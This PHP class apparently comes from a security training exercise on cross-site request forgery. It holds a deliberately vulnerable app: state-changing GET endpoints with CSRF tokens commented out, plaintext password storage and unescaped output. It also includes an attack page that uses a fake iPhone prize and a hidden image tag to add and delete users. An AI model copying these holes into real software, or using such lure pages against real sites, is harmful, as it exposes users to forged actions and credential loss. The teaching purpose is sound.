<?php

declare(strict_types=1);

namespace Epignosis\Academy\Security;

use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;

class Ex01CSRF
{
    const DB_FILE_PATH = '/tmp/users.csv';
    protected $users;

    function __construct()
    {
        // Use session to store and validate tokens
        //session_start();

        // CSRF token is only created on first visit
        //if(empty($_SESSION['csrf_token'])) {
        //    $_SESSION['csrf_token'] = Helper::generateToken(10);
        //}

        $this->loadUsers();
    }

    protected function loadUsers()
    {
        if(!file_exists(self::DB_FILE_PATH)){
            touch(self::DB_FILE_PATH);
        }

        $contents = file_get_contents(self::DB_FILE_PATH);
        $lines = explode(PHP_EOL, $contents); // Break rows

        $this->users = array();

        foreach($lines as $line) {
            if(strlen($line) == 0) {
                continue;
            }

            $this->users[] = explode(',', $line); // Break columns
        }
    }

    public function add(ServerRequestInterface $request, ResponseInterface $response, array $args): ResponseInterface
    {
        file_put_contents(self::DB_FILE_PATH, $_GET['email'].','.$_GET['password'].PHP_EOL, FILE_APPEND);

        return Helper::redirect($response, '/ex01/');
    }

    public function delete(ServerRequestInterface $request, ResponseInterface $response, array $args): ResponseInterface
    {
        $row = (int)$args['id'];
        unset($this->users[$row-1]);

        $data = ''; // Empty file

        if(count($this->users) != 0) {
            $lines = [];

            foreach($this->users as $user) {
                $lines[] = implode(',', $user);
            }

            $data = implode(PHP_EOL, $lines).PHP_EOL;
        }

        file_put_contents(self::DB_FILE_PATH, $data);

        return Helper::redirect($response, '/ex01/');
    }

    public function home(ServerRequestInterface $request, ResponseInterface $response, array $args): ResponseInterface
    {
        // CSRF token refreshed on each API call
        //$_SESSION['csrf_token'] = Helper::generateToken(10);

        $counter = 1;
        $rows = '';
        foreach ($this->users as $user){
            $rows .= <<<EOT
    <tr>
      <th scope="row">{$counter}</th>
      <td>{$user[0]}</td>
      <td style="width: 150px"><a class="btn btn-danger" href="del/{$counter}" role="button"><i class="bi-trash"></i> Delete</a></td>
    </tr>
EOT;
            $counter++;
        }

        $content = <<<EOT
<div class="alert alert-success" role="alert">
  Legitimate use of the App
</div>
<form action="add">
  <div class="mb-3">
    <label for="exampleInputEmail1" class="form-label">Email address</label>
    <input type="email" class="form-control" id="exampleInputEmail1" name="email" required>
  </div>
  <div class="mb-3">
    <label for="exampleInputPassword1" class="form-label">Password</label>
    <input type="password" class="form-control" id="exampleInputPassword1" name="password" required>
  </div>
  <button type="submit" class="btn btn-primary" style="margin-top: 10px;"><i class="bi-plus"></i> Add</button>
</form>
<table class="table" style="margin-top: 20px;">
  <thead>
    <tr>
      <th scope="col">#</th>
      <th scope="col">Email</th>
      <th scope="col"></th>
    </tr>
  </thead>
  <tbody>
  {$rows}
  </tbody>
</table>
EOT;

        $response->getBody()->write($content);
        return $response;
    }

    public function leet(ServerRequestInterface $request, ResponseInterface $response, array $args): ResponseInterface
    {
        $content = <<<EOT
<script>
function addUser(){
	var email = 'john.doe%40evilempire.com'
	var password = '123'
	var url = 'http://localhost:8000/ex01/add?email=' + email + '&password=' + password
    var myModalEl = document.querySelector('#exampleModal')
    var modal = bootstrap.Modal.getOrCreateInstance(myModalEl) // Returns a Bootstrap modal instance
	
	fetch(url).then(
        modal.show()
	)
}
</script>
<div class="alert alert-danger" role="alert">
  Malicious use of the App
</div>
<button type="button" onClick="addUser()" class="btn btn-primary">Congratulations! You won an iPhone press any button to confirm</button><br/><br/>
<img src="http://localhost:8000/ex01/del/3" width="50" height="50">
<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Thank you!</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        One of our minions will deliver the iPhone to your doorstep!
        <img src="/images/minion.png" />
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
EOT;

        $response->getBody()->write($content);
        return $response;
    }
}
